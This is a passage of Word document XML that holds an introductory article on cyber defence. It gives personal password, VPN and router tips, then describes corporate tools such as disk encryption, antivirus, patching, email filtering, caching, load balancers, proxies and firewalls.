        <w:t xml:space="preserve"> public </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>WiFi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00426A46">
        <w:t xml:space="preserve">If you are on public </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00426A46">
        <w:t>WiFi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00426A46">
        <w:t>, u</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">se </w:t>
      </w:r>
      <w:r w:rsidR="00F9607B">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">VPN </w:t>
      </w:r>
      <w:r w:rsidR="00426A46">
        <w:t xml:space="preserve">tunnel </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">like </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>TunnelBear</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> (free) before </w:t>
      </w:r>
      <w:r w:rsidR="007C127C">
        <w:t>using it for anything</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B021863" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="003D18FA">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003D18FA">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Secure your </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Home </w:t>
      </w:r>
      <w:r w:rsidRPr="003D18FA">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Router</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A6E66FA" w14:textId="01943E77" w:rsidR="003D18FA" w:rsidRPr="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="003D18FA">
      <w:r>
        <w:t xml:space="preserve">Make sure </w:t>
      </w:r>
      <w:r w:rsidR="00F9607B">
        <w:t>a strong password protects the administration of your home router</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58717CEE" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRPr="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="003D18FA">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003D18FA">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Customize </w:t>
      </w:r>
      <w:r w:rsidR="00E93450">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r w:rsidRPr="003D18FA">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">rivacy </w:t>
      </w:r>
      <w:r w:rsidR="00E93450">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r w:rsidRPr="003D18FA">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ettings on Software</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14D296D2" w14:textId="2D5AB93A" w:rsidR="003D18FA" w:rsidRDefault="007C127C" w:rsidP="003D18FA">
      <w:r>
        <w:t>N</w:t>
      </w:r>
      <w:r w:rsidR="003D18FA">
        <w:t xml:space="preserve">one of </w:t>
      </w:r>
      <w:r>
        <w:t>the software you use, including your browser,</w:t>
      </w:r>
      <w:r w:rsidR="003D18FA">
        <w:t xml:space="preserve"> has a </w:t>
      </w:r>
      <w:r w:rsidR="00F9607B">
        <w:t>strict</w:t>
      </w:r>
      <w:r w:rsidR="003D18FA">
        <w:t xml:space="preserve"> privacy policy by default. Please change the default security setting of all software that you use</w:t>
      </w:r>
      <w:r w:rsidR="00F9607B">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> including your Social Media Software.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DF0C064" w14:textId="77777777" w:rsidR="00E93450" w:rsidRDefault="007C127C" w:rsidP="007C127C">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Never </w:t>
      </w:r>
      <w:r w:rsidR="00E93450">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">et </w:t>
      </w:r>
      <w:r w:rsidR="00A409A6">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">our </w:t>
      </w:r>
      <w:r w:rsidR="00A409A6">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">rowser </w:t>
      </w:r>
      <w:r w:rsidR="00E93450">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Save Your Password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4811AED2" w14:textId="6B4C6312" w:rsidR="00E93450" w:rsidRPr="00E93450" w:rsidRDefault="00E93450" w:rsidP="007C127C">
      <w:r>
        <w:t>Your browser may prompt you to save your password</w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t>;</w:t>
      </w:r>
      <w:r w:rsidR="00A409A6">
        <w:t xml:space="preserve"> never say </w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00A409A6">
        <w:t>Yes</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t>. T</w:t>
      </w:r>
      <w:r w:rsidR="00A409A6">
        <w:t>urn off th</w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t>is feature</w:t>
      </w:r>
      <w:r w:rsidR="00A409A6">
        <w:t>. Always remember convenience is the enemy of security. Keeping your card key in the car is very convenient</w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00A409A6">
        <w:t xml:space="preserve"> but it is </w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t>high</w:t>
      </w:r>
      <w:r w:rsidR="00A409A6">
        <w:t xml:space="preserve">ly unsecured. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="696C76BE" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRPr="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="003D18FA">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003D18FA">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Use Long Password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="011449AB" w14:textId="048D76AB" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="003D18FA">
      <w:r>
        <w:t>Longer</w:t>
      </w:r>
      <w:r w:rsidR="004F53AC">
        <w:t xml:space="preserve"> sentences for </w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="004F53AC">
        <w:t>password</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are better than </w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidR="004F53AC">
        <w:t>ryptic but short password.</w:t>
      </w:r>
      <w:r w:rsidR="00A409A6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t>M</w:t>
      </w:r>
      <w:r w:rsidR="004F53AC">
        <w:t>isspell a word or two</w:t>
      </w:r>
      <w:r w:rsidR="00A409A6">
        <w:t xml:space="preserve"> in your password to avoid </w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="00A409A6">
        <w:t>Dictionary Attack</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidR="004F53AC">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="025AD527" w14:textId="77777777" w:rsidR="004F53AC" w:rsidRDefault="004F53AC" w:rsidP="003D18FA">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Use Two Factor Authentication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71AFFD34" w14:textId="420E1EDD" w:rsidR="004F53AC" w:rsidRPr="004F53AC" w:rsidRDefault="004F53AC" w:rsidP="003D18FA">
      <w:r>
        <w:t>Use 2-factor authentication whenever possible. This will force you to login using your password and your phone/email. This increases your defense by many factors.</w:t>
      </w:r>
      <w:r w:rsidR="00A409A6">
        <w:t xml:space="preserve"> This is inconvenient even for you, therefore, much more secure.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07919689" w14:textId="77777777" w:rsidR="004F53AC" w:rsidRPr="003D18FA" w:rsidRDefault="00A409A6" w:rsidP="004F53AC">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Unique</w:t>
      </w:r>
      <w:r w:rsidR="004F53AC" w:rsidRPr="003D18FA">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> Password</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7748BA71" w14:textId="2D323796" w:rsidR="004F53AC" w:rsidRDefault="004F53AC" w:rsidP="003D18FA">
      <w:r>
        <w:t xml:space="preserve">Passwords must be unique </w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>n every site. Never use the same in two sites.</w:t>
      </w:r>
      <w:r w:rsidR="00A409A6">
        <w:t xml:space="preserve"> A stolen/cracked password from one site is bad enough</w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t>;</w:t>
      </w:r>
      <w:r w:rsidR="00FB34B5">
        <w:t xml:space="preserve"> you don</w:t>
      </w:r>
      <w:r w:rsidR="00A46EA1">
        <w:t>'</w:t>
      </w:r>
      <w:r w:rsidR="00FB34B5">
        <w:t xml:space="preserve">t want another site to be compromised because you were lazy enough to use the same password </w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t>o</w:t>
      </w:r>
      <w:r w:rsidR="00FB34B5">
        <w:t>n two sites.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C25757D" w14:textId="77777777" w:rsidR="004F53AC" w:rsidRPr="004F53AC" w:rsidRDefault="004F53AC" w:rsidP="003D18FA">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004F53AC">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Use Password Manager</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="041920BE" w14:textId="3432F29C" w:rsidR="004F53AC" w:rsidRDefault="004F53AC" w:rsidP="003D18FA">
      <w:r>
        <w:t>Password Manager is a great way to store all your passwords in a secure</w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t xml:space="preserve"> place, no matter how long or</w:t>
      </w:r>
      <w:r w:rsidR="00FB34B5">
        <w:t xml:space="preserve"> complex they are</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="009D2BCD">
        <w:t>Dashlane</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="009D2BCD">
        <w:t xml:space="preserve">, 1Password, </w:t>
      </w:r>
      <w:r>
        <w:t>LastPass</w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009D2BCD">
        <w:t>etc.</w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="009D2BCD">
        <w:t xml:space="preserve"> are </w:t>
      </w:r>
      <w:r>
        <w:t>great tool</w:t>
      </w:r>
      <w:r w:rsidR="009D2BCD">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for this. Make sure you use 2-factor authentication to log</w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>in to your password manager</w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="009D2BCD">
        <w:t xml:space="preserve"> and your password manager logs you out 1) when idle for few seconds 2) when you close your browser. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5309D4D1" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="008F3B97">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Cyber </w:t>
      </w:r>
      <w:r w:rsidR="008F3B97">
        <w:t>Defense</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009D2BCD">
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:t>Corporate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B362DD1" w14:textId="6EA5D1F7" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="008F3B97">
      <w:r>
        <w:t xml:space="preserve">What do corporations do to improve cyber </w:t>
      </w:r>
      <w:r w:rsidR="008F3B97">
        <w:t>defense</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">? There are many tools and techniques that corporations use to </w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t>enhanc</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e their cybersecurity. Below are some of the </w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t>method</w:t>
      </w:r>
      <w:r>
        <w:t>s and tools:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2888873D" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRPr="008F3B97" w:rsidRDefault="003D18FA" w:rsidP="008F3B97">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008F3B97">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Disk Encryption</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18B9009C" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="008F3B97">
      <w:r>
        <w:t>Tools like McAfee Drive Encryption is full disk encryption software that helps protect data on Microsoft Windows tablets, laptops, and PCs to prevent the loss of sensitive data, especially from lost or stolen equipment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C592529" w14:textId="5E040AE6" w:rsidR="003D18FA" w:rsidRPr="008F3B97" w:rsidRDefault="003D18FA" w:rsidP="008F3B97">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008F3B97">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Antivirus Software</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52F34A1E" w14:textId="627D40FB" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="008F3B97">
      <w:r>
        <w:t xml:space="preserve">Tools like McAfee Anti-virus software is installed in all servers and workstations to stop malware from attacking machines. These tools receive </w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">frequent update on the list of </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>malware</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> and their protective mechanism.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A6F51E4" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRPr="008F3B97" w:rsidRDefault="003D18FA" w:rsidP="008F3B97">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008F3B97">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Patching and Upgrades</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BA56E5E" w14:textId="172835AE" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="008F3B97">
      <w:r>
        <w:t xml:space="preserve">Continuous patching and upgrades of </w:t>
      </w:r>
      <w:r w:rsidR="009D2BCD">
        <w:t xml:space="preserve">phones, tablets, </w:t>
      </w:r>
      <w:r>
        <w:t>workstations</w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t>, and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> server</w:t>
      </w:r>
      <w:r w:rsidR="009D2BCD">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> keep corporates protected from </w:t>
      </w:r>
      <w:r w:rsidR="008F3B97">
        <w:t>vulnerabilities</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Tools like IBM BigFix allows </w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r>
        <w:t>corporation to keep their workstations</w:t>
      </w:r>
      <w:r w:rsidR="009D2BCD">
        <w:t xml:space="preserve"> and servers</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>up-to-date</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> with patches and upgrades.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1488047C" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRPr="008F3B97" w:rsidRDefault="003D18FA" w:rsidP="008F3B97">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008F3B97">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Email Quarantine Software</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4120D819" w14:textId="29D6F8C7" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="008F3B97">
      <w:r>
        <w:t>Spam emails and Phishing attacks are everyday events in today</w:t>
      </w:r>
      <w:r w:rsidR="00071855">
        <w:t>'s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> world. Companies use tools to quarantine emails to block such attempts. Proofpoint Protection Server is </w:t>
      </w:r>
      <w:r w:rsidR="00C54C07">
        <w:t xml:space="preserve">a tool that monitors incoming emails and filters </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00C54C07">
        <w:t>them, and</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00C54C07">
        <w:t xml:space="preserve"> presents</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> block reports to the users.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="240F02C3" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRPr="008F3B97" w:rsidRDefault="003D18FA" w:rsidP="008F3B97">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008F3B97">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Content Caching</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EE9B7D9" w14:textId="5E144D6B" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="008F3B97">
      <w:r>
        <w:t>One of the best way</w:t>
      </w:r>
      <w:r w:rsidR="008F3B97">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to provide </w:t>
      </w:r>
      <w:r w:rsidR="00C54C07">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">quick response and defend </w:t>
      </w:r>
      <w:r w:rsidR="00C54C07">
        <w:t xml:space="preserve">against </w:t>
      </w:r>
      <w:r>
        <w:t>denial of service</w:t>
      </w:r>
      <w:r w:rsidR="008F3B97">
        <w:t xml:space="preserve"> (DOS)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> attack is to use distributed content caching software in front of </w:t>
      </w:r>
      <w:r w:rsidR="00C54C07">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t>public</w:t>
      </w:r>
      <w:r w:rsidR="00C54C07">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">facing web application. The content caching software will work as a proxy to </w:t>
      </w:r>
      <w:r w:rsidR="00C54C07">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">company's web infrastructure and render cached contents to the browser whenever available. If the content is not already cached, the software will fetch the content, cache it and then </w:t>
      </w:r>
      <w:r w:rsidR="00C54C07">
        <w:t>yield</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to the browser. This way, the </w:t>
      </w:r>
      <w:r w:rsidR="00C54C07">
        <w:t>subsequen</w:t>
      </w:r>
      <w:r>
        <w:t>t request will be served from the cached. Of course, this mechanism does not help if the content changes on every request, but it works for a large portion of the website. Akamai is a well-known content caching software that is widely used for this type of caching. Akamai has distribute</w:t>
      </w:r>
      <w:r w:rsidR="009D2BCD">
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> network throughout the globe.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="173EE4D7" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRPr="008F3B97" w:rsidRDefault="003D18FA" w:rsidP="008F3B97">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008F3B97">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Load Balancing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62DDB9E3" w14:textId="54941827" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="008F3B97">
      <w:r>
        <w:t xml:space="preserve">Having only one web server that handles all the traffic is </w:t>
      </w:r>
      <w:r w:rsidR="00C54C07">
        <w:t>hazardous</w:t>
      </w:r>
      <w:r>
        <w:t>. So, companies put out many web servers. These servers distribute the traffic among themselves by using a load balancer in front of them. The browser hits the load</w:t>
      </w:r>
      <w:r w:rsidR="00C54C07">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>balancer and load</w:t>
      </w:r>
      <w:r w:rsidR="00C54C07">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>balancer - in turn - decides which server has capacity and hands off the traffic to that server. F5 Big IP is a popular load</w:t>
      </w:r>
      <w:r w:rsidR="00C54C07">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">balancer. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F3112A1" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRPr="008F3B97" w:rsidRDefault="003D18FA" w:rsidP="008F3B97">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008F3B97">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Proxy Servers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48A48A2C" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="008F3B97">
      <w:r>
        <w:t>There are two kinds of proxy servers that are in use:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B55922C" w14:textId="6835C78C" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="008F3B97">
      <w:r>
        <w:t xml:space="preserve">Forward proxy: Forward proxy will </w:t>
      </w:r>
      <w:r w:rsidR="00EA3BB9">
        <w:t xml:space="preserve">receive </w:t>
      </w:r>
      <w:r w:rsidR="00C54C07">
        <w:t>request</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> clients (browser) and forward it </w:t>
      </w:r>
      <w:r w:rsidR="00EA3BB9">
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">the ultimate destination or block it based on examination results. For example, a browser proxy </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">might refuse to let you go to a site known to have malware embedded in </w:t>
      </w:r>
      <w:r w:rsidR="00EA3BB9">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">content. Forward proxy protects clients from malleolus or undesirable contents. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Zscaler</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Cloud Firewall is a popular browser proxy that handles SSL inspection.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CD59A2B" w14:textId="73EBAAEB" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="008F3B97">
      <w:r>
        <w:t xml:space="preserve">Reverse proxy: A reverse proxy will take requests on behalf of servers before handing </w:t>
      </w:r>
      <w:r w:rsidR="00DA0957">
        <w:t>them</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> off to a server. Reverse proxy protects servers from cyber-attacks. With multiple web servers in place, a load balancer is enough. When you have only one server, a reverse proxy makes sense to secure the webserver. NGINX</w:t>
      </w:r>
      <w:r w:rsidR="008F3B97">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="008F3B97">
        <w:t xml:space="preserve">pronounced </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Engine</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00DF3303">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">X) Plus can act as </w:t>
      </w:r>
      <w:r w:rsidR="00DA0957">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r>
        <w:t>reverse proxy. By the way</w:t>
      </w:r>
      <w:r w:rsidR="00DA0957">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> "NGINX" is a popular web server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39884AF3" w14:textId="77777777" w:rsidR="003D18FA" w:rsidRPr="00DF3303" w:rsidRDefault="003D18FA" w:rsidP="00DF3303">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DF3303">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Firewalls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CB01243" w14:textId="0989B0E7" w:rsidR="003D18FA" w:rsidRDefault="003D18FA" w:rsidP="00DF3303">
      <w:r>
        <w:t xml:space="preserve">As </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>discussed</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> earlier </w:t>
      </w:r>
      <w:r w:rsidR="00DA0957">
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">irewall protects servers and ports. It also allows </w:t>
      </w:r>
      <w:r w:rsidR="00DA0957">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t>creation of DMZ so that only public</w:t>
      </w:r>
      <w:r w:rsidR="00DA0957">
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">facing servers are exposed to </w:t>
      </w:r>
      <w:r w:rsidR="00DA0957">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t>public</w:t>
      </w:r>
      <w:r w:rsidR="00DA0957">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidR="00DA0957">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">rest of the infrastructure is protected behind </w:t>
      </w:r>
      <w:r w:rsidR="00DA0957">
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r>
        <w:t>strict firewall. Palo Alto is a popular firewall software used for this purpose.</w:t>
      </w:r>
    </w:p>
